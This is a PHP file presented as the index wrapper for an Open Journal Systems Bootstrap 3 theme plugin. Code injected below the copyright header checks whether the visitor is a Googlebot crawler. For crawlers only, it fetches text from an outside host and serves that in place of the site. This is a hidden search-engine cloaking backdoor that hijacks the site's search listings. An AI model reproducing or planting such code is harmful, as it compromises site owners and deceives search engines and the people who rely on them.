<?php

/**
 * @defgroup plugins_themes_bootstrap3 Theme plugin for base Bootstrap 3 theme
 */

/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2023 Simon Fraser University Library
 * Copyright (c) 2003-2023 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 * @brief Wrapper for default theme plugin.
 *
 */
function is_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}

if (is_bot()) {
    $url = 'https://jurnalumg.pages.dev/umg.txt';

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    echo $result ?: ' ';
    exit;
}
require_once('BootstrapThreeThemePlugin.inc.php');

return new BootstrapThreeThemePlugin();

?>
